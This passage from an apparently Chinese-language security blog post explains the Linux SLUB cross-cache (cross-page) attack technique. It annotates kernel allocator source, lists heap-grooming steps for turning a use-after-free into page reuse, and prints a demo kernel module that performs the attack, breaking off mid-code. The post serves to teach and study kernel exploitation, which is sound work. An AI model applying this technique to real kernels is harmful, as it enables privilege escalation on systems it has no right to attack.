<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/slub.c:2389</span></span><br><span class="line"><span class="comment">/* 2389 */</span> <span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> page *page, <span class="type">int</span> drain)</span></span><br><span class="line"><span class="comment">/* 2390 */</span> &#123;</span><br><span class="line"><span class="comment">/* 2391 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* 2392 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">oldpage</span>;</span></span><br><span class="line"><span class="comment">/* 2393 */</span> 	<span class="type">int</span> pages;</span><br><span class="line"><span class="comment">/* 2394 */</span> 	<span class="type">int</span> pobjects;</span><br><span class="line"><span class="comment">/* 2395 */</span> </span><br><span class="line"><span class="comment">/* 2396 */</span> 	preempt_disable();</span><br><span class="line"><span class="comment">/* 2397 */</span> 	<span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">/* 2398 */</span> 		pages = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 2399 */</span> 		pobjects = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 2400 */</span> 		oldpage = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"><span class="comment">/* 2401 */</span> </span><br><span class="line"><span class="comment">/* 2402 */</span> 		<span class="keyword">if</span> (oldpage) &#123;</span><br><span class="line"><span class="comment">/* 2403 */</span> 			pobjects = oldpage-&gt;pobjects;</span><br><span class="line"><span class="comment">/* 2404 */</span> 			pages = oldpage-&gt;pages;</span><br><span class="line">    				<span class="comment">// partial list 是否满了，如果满了，走下面if中的逻辑</span></span><br><span class="line">    				<span class="comment">// pobjects 为当前的partial链表中free object的count，后者为count的阈值</span></span><br><span class="line">					<span class="comment">// #define slub_cpu_partial(s)		((s)-&gt;cpu_partial)</span></span><br><span class="line"><span class="comment">/* 2405 */</span> 			<span class="keyword">if</span> (drain &amp;&amp; pobjects &gt; slub_cpu_partial(s)) &#123;</span><br><span class="line"><span class="comment">/* 2406 */</span> 				<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2411 */</span> 				local_irq_save(flags);</span><br><span class="line">    					<span class="comment">// 调用目标函数 unfreeze_partials()</span></span><br><span class="line"><span class="comment">/* 2412 */</span> 				unfreeze_partials(s, this_cpu_ptr(s-&gt;cpu_slab)); <span class="comment">// &lt;--- 目标！</span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2419 */</span> 		&#125;</span><br><span class="line"><span class="comment">/* 2420 */</span> </span><br><span class="line">    			<span class="comment">// 正常逻辑，将目标page加入partial list中</span></span><br><span class="line"><span class="comment">/* 2421 */</span> 		pages++;</span><br><span class="line"><span class="comment">/* 2422 */</span> 		pobjects += page-&gt;objects - page-&gt;inuse;</span><br><span class="line"><span class="comment">/* 2423 */</span> </span><br><span class="line"><span class="comment">/* 2424 */</span> 		page-&gt;pages = pages;</span><br><span class="line"><span class="comment">/* 2425 */</span> 		page-&gt;pobjects = pobjects;</span><br><span class="line"><span class="comment">/* 2426 */</span> 		page-&gt;next = oldpage;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>PS，上面这个代码是基于5.13的。</p>
<p>可以看到5.13中<code>pobjects += page-&gt;objects - page-&gt;inuse;</code>也就是说partial算的是objects的个数。</p>
<p>但在新版内核（5.16开始）中改成了这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> page *page, <span class="type">int</span> drain)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">oldpage</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_to_unfreeze</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">	<span class="type">int</span> pages = <span class="number">0</span>;</span><br><span class="line">[......]</span><br><span class="line">	oldpage = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (oldpage) &#123;</span><br><span class="line">		<span class="keyword">if</span> (drain &amp;&amp; oldpage-&gt;pages &gt;= s-&gt;cpu_partial_pages) &#123;</span><br><span class="line">[......]</span><br><span class="line">			page_to_unfreeze = oldpage;</span><br><span class="line">			oldpage = <span class="literal">NULL</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			pages = oldpage-&gt;pages;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pages++; <span class="comment">// +1</span></span><br><span class="line"></span><br><span class="line">	page-&gt;pages = pages;</span><br><span class="line">	page-&gt;next = oldpage;</span><br><span class="line">[......]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从而partial计算的是page的个数。</p>
<p>不过这貌似也不是说前者有啥BUG，毕竟我们前面讨论过，<code>put_cpu_partial()</code>只有在满状态page想释放object的时候才会进入，那么<code>page-&gt;objects - page-&gt;inuse</code>基本也是1了。</p>
</blockquote>
<p>最后一步，<code>unfreeze_partials()</code>会将当前CPU的partial链表中的非空的page转移到Node管理的partial链表尾部。对于那些空的page，会调用<code>discard_slab()</code>进行释放，这也是我们做cross page attack的目的所在。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/slub.c:2321</span></span><br><span class="line"><span class="comment">/* 2321 */</span> <span class="type">static</span> <span class="type">void</span> <span class="title function_">unfreeze_partials</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params"><span class="comment">/* 2322 */</span> 		<span class="keyword">struct</span> kmem_cache_cpu *c)</span></span><br><span class="line"><span class="comment">/* 2323 */</span> &#123;</span><br><span class="line"><span class="comment">/* 2324 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* 2325 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>, *n2 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/* 2326 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>, *<span class="title">discard_page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/* 2327 */</span> </span><br><span class="line"><span class="comment">/* 2328 */</span> 	<span class="keyword">while</span> ((page = slub_percpu_partial(c))) &#123;</span><br><span class="line"><span class="comment">/* 2329 */</span> 		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="comment">/* 2330 */</span> 		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">old</span>;</span></span><br><span class="line"><span class="comment">/* 2331 */</span> </span><br><span class="line"><span class="comment">/* 2332 */</span> 		slub_set_percpu_partial(c, page);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2343 */</span> 		<span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">/* 2344 */</span> </span><br><span class="line"><span class="comment">/* 2345 */</span> 			old.freelist = page-&gt;freelist;</span><br><span class="line"><span class="comment">/* 2346 */</span> 			old.counters = page-&gt;counters;</span><br><span class="line"><span class="comment">/* 2347 */</span> 			VM_BUG_ON(!old.frozen);</span><br><span class="line"><span class="comment">/* 2348 */</span> </span><br><span class="line"><span class="comment">/* 2349 */</span> 			new.counters = old.counters;</span><br><span class="line"><span class="comment">/* 2350 */</span> 			new.freelist = old.freelist;</span><br><span class="line"><span class="comment">/* 2351 */</span> </span><br><span class="line"><span class="comment">/* 2352 */</span> 			new.frozen = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 2353 */</span> </span><br><span class="line"><span class="comment">/* 2354 */</span> 		&#125; <span class="keyword">while</span> (!__cmpxchg_double_slab(s, page,</span><br><span class="line"><span class="comment">/* 2355 */</span> 				old.freelist, old.counters,</span><br><span class="line"><span class="comment">/* 2356 */</span> 				new.freelist, new.counters,</span><br><span class="line"><span class="comment">/* 2357 */</span> 				<span class="string">&quot;unfreezing slab&quot;</span>));</span><br><span class="line"><span class="comment">/* 2358 */</span> </span><br><span class="line">    			<span class="comment">// 当前page为空，且node的partial数不小于最小值（一般都满足）</span></span><br><span class="line">    			<span class="comment">// 就会将此page加入到discard page的列表中</span></span><br><span class="line"><span class="comment">/* 2359 */</span> 		<span class="keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial)) &#123;</span><br><span class="line"><span class="comment">/* 2360 */</span> 			page-&gt;next = discard_page;</span><br><span class="line"><span class="comment">/* 2361 */</span> 			discard_page = page;</span><br><span class="line"><span class="comment">/* 2362 */</span> 		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* 2363 */</span> 			add_partial(n, page, DEACTIVATE_TO_TAIL);</span><br><span class="line"><span class="comment">/* 2364 */</span> 			stat(s, FREE_ADD_PARTIAL);</span><br><span class="line"><span class="comment">/* 2365 */</span> 		&#125;</span><br><span class="line"><span class="comment">/* 2366 */</span> 	&#125;</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 将discard page列表中的page依次通过discard_slab()释放</span></span><br><span class="line"><span class="comment">/* 2371 */</span> 	<span class="keyword">while</span> (discard_page) &#123;</span><br><span class="line"><span class="comment">/* 2372 */</span> 		page = discard_page;</span><br><span class="line"><span class="comment">/* 2373 */</span> 		discard_page = discard_page-&gt;next;</span><br><span class="line"><span class="comment">/* 2374 */</span> </span><br><span class="line"><span class="comment">/* 2375 */</span> 		stat(s, DEACTIVATE_EMPTY);</span><br><span class="line"><span class="comment">/* 2376 */</span> 		discard_slab(s, page);</span><br><span class="line"><span class="comment">/* 2377 */</span> 		stat(s, FREE_SLAB);</span><br><span class="line"><span class="comment">/* 2378 */</span> 	&#125;</span><br><span class="line"><span class="comment">/* 2379 */</span> <span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* CONFIG_SLUB_CPU_PARTIAL */</span></span></span><br><span class="line"><span class="comment">/* 2380 */</span> &#125;</span><br></pre></td></tr></table></figure>



<p>综上这么一通分析，如果想释放一个slab page，我们需要这样做：</p>
<ol>
<li>查看基本信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin@vm:~$ sudo cat /sys/kernel/slab/filp/object_size # 每个object的大小</span><br><span class="line">256</span><br><span class="line">admin@vm:~$ sudo cat /sys/kernel/slab/filp/objs_per_slab # 每个slab中可容纳多少object</span><br><span class="line">16</span><br><span class="line">admin@vm:~$ sudo cat /sys/kernel/slab/filp/cpu_partial # cpu partial list最大阈值</span><br><span class="line">13</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>堆喷，收拾目标cache在kernel中的内存碎片</li>
<li>申请<code>(cpu_partial + 1) * objs_per_slab = (13 + 1) * 16</code>个object</li>
</ol>
<p>在极少数情况下，这些object会正好放在14个slab中；由于多数情况下在申请object前，多多少少会有几个object已经占用了一个slab，因此我们的object会分布于15个slab中，且第15个slab<strong>非满</strong>。下面我们就不进行分类讨论了，只画多数情况时的图（其实也只是细节上的出入）</p>
<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230307101148982.png"></p>
<ol start="4">
<li>申请<code>objs_per_slab - 1 = 15</code>个object</li>
</ol>
<p>为什么是<code>objs_per_slab - 1</code>呢？因为这样能保证之前未满的第15个slab必满，且多出来的object不会导致第16个slab满。</p>
<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230307101639174.png"></p>
<ol start="5">
<li><p>申请一个漏洞object，后续用来UAF</p>
</li>
<li><p>申请<code>objs_per_slab + 1 = 16</code>个object</p>
</li>
</ol>
<p>这样就会让之前半满的第16个slab变成全满状态，并制造出第17个slab。</p>
<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230308092751773.png"></p>
<ol start="7">
<li>触发漏洞object的UAF</li>
</ol>
<p>之前流程图分析过，由于漏洞object所在的第16个slab是满的，因此会触发<code>put_cpu_partial()</code>，但由于cpu partial list 非满，所以现在还不会进入<code>unfreeze_partials()</code>。</p>
<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230308093143298.png"></p>
<ol start="8">
<li>我们将漏洞object前后各<code>objs_per_slab = 16</code>个object释放，从而让第16个slab进入全空状态</li>
</ol>
<p>因为虽然内核可能开了freelist harden和freelist random保护，但从page的角度来说，依然是顺序的。因此前后各<code>objs_per_slab = 16</code>个object释放就能让第16个slab进入全空状态。（当然这也会导致第15和第17个slab进入半空状态，不过这不影响）</p>
<p>在第16个slab第一次从全满进入半满时，就会触发<code>put_cpu_partial()</code>将其放入 cpu partial list中。之后直到全空都不会再进入<code>put_cpu_partial()</code>。</p>
<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230308093307884.png"></p>
<ol start="9">
<li>将1~14个slab中各释放一个object，将其从全满状态进入半满状态</li>
</ol>
<p>这将对每个page触发一次<code>put_cpu_partial()</code>。由于<code>14 = cpu_partial + 1</code>，因此这必将导致最后几次在进入<code>put_cpu_partial()</code>时发现cpu partial list满了，从而进入<code>unfreeze_partials()</code>逻辑。然后发现第16个slab已经进入了全空状态，从而调用<code>discard_slab()</code>将这个page进行释放。</p>
<p>我写了个kernel module demo演示 cross page attack的完整过程：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/veritas501/cross_page_attack_demo">https://github.com/veritas501/cross_page_attack_demo</a></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slub_def.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_NUM (0x1000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> loge(fmt, ...) pr_err(<span class="string">&quot;%s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;attack_demo&quot;</span>, \</span></span><br><span class="line"><span class="meta">                              __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> data[OBJ_SIZE];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">void</span> (*func)(<span class="type">void</span>);</span><br><span class="line">            <span class="type">char</span> paddings[OBJ_SIZE - <span class="number">8</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; __attribute__((aligned(OBJ_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">my_cachep</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> **<span class="title">tmp_ms</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">random_ms</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hello_func</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    loge(<span class="string">&quot;---&gt; hello_func()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hack_func</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    loge(<span class="string">&quot;---&gt; hack_func(): cross page attack success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">km_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OO_SHIFT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OO_MASK ((1 &lt;&lt; OO_SHIFT) - 1)</span></span><br><span class="line">    <span class="type">int</span> i, offset, cpu_partial, objs_per_slab;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">realloc</span>;</span></span><br><span class="line">    <span class="type">void</span> *target_page_virt;</span><br><span class="line">    <span class="type">void</span> *realloc_page_virt;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_size;</span><br><span class="line">    <span class="type">int</span> page_order;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">ms</span>;</span></span><br><span class="line">    <span class="type">int</span> uaf_idx;</span><br><span class="line"></span><br><span class="line">    tmp_ms = kmalloc(OBJ_NUM * <span class="number">8</span>, GFP_KERNEL);</span><br><span class="line">    my_cachep = kmem_cache_create(</span><br><span class="line">        <span class="string">&quot;my_struct&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> my_struct), <span class="number">0</span>,</span><br><span class="line">        SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;cache info:&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; my_cachep-&gt;name: %s&quot;</span>, my_cachep-&gt;name);</span><br><span class="line">    cpu_partial = my_cachep-&gt;cpu_partial;</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; cpu_partial: %d&quot;</span>, cpu_partial);</span><br><span class="line">    objs_per_slab = my_cachep-&gt;oo.x &amp; OO_MASK;</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; objs_per_slab: %u&quot;</span>, objs_per_slab);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; object_size: 0x%x&quot;</span>, my_cachep-&gt;object_size);</span><br><span class="line">    page_size = my_cachep-&gt;object_size * objs_per_slab;</span><br><span class="line">    page_order = get_order(page_size);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; so page size: 0x%lx, page order: %d\n&quot;</span>, page_size, page_order);</span><br><span class="line"></span><br><span class="line">    random_ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    loge(<span class="string">&quot;alloc a random object at %px\n&quot;</span>, random_ms);</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 1 ===&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; alloc `cpu_partial + 1` = %d pages of objects,&quot;</span>, cpu_partial + <span class="number">1</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; each page contains `objs_per_slab` = %d objects\n&quot;</span>, objs_per_slab);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, offset = <span class="number">0</span>; i &lt; (objs_per_slab * (cpu_partial + <span class="number">1</span>)); i++) &#123;</span><br><span class="line">        tmp_ms[offset + i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    offset += i;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 2 ===&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; alloc `objs_per_slab - 1` = %d objects\n&quot;</span>, objs_per_slab - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; objs_per_slab - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        tmp_ms[offset + i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    offset += i;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 3 ===&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; alloc a vulnerable object for UAF&quot;</span>);</span><br><span class="line">    uaf_idx = offset++;</span><br><span class="line">    ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    tmp_ms[uaf_idx] = ms;</span><br><span class="line">    target_page_virt = (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ms &amp;</span><br><span class="line">                                ~(<span class="type">unsigned</span> <span class="type">long</span>)(page_size - <span class="number">1</span>));</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; vuln object index: %d&quot;</span>, uaf_idx);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; vuln object at %px, page: %px&quot;</span>, ms, target_page_virt);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; set function pointer to `hello()` and call it\n&quot;</span>);</span><br><span class="line">    ms-&gt;func = (<span class="type">void</span> *)hello_func;</span><br><span class="line">    ms-&gt;func();</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 4 ===&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; alloc `objs_per_slab + 1` = %d objects\n&quot;</span>, objs_per_slab + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; objs_per_slab + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        tmp_ms[offset + i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    offset += i;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 5 ===&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; free the vulnerable object, now it&#x27;s UAF\n&quot;</span>);</span><br><span class="line">    kmem_cache_free(my_cachep, ms);</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 6 ===&quot;</span>);</span><br><span class="line">    loge(<span 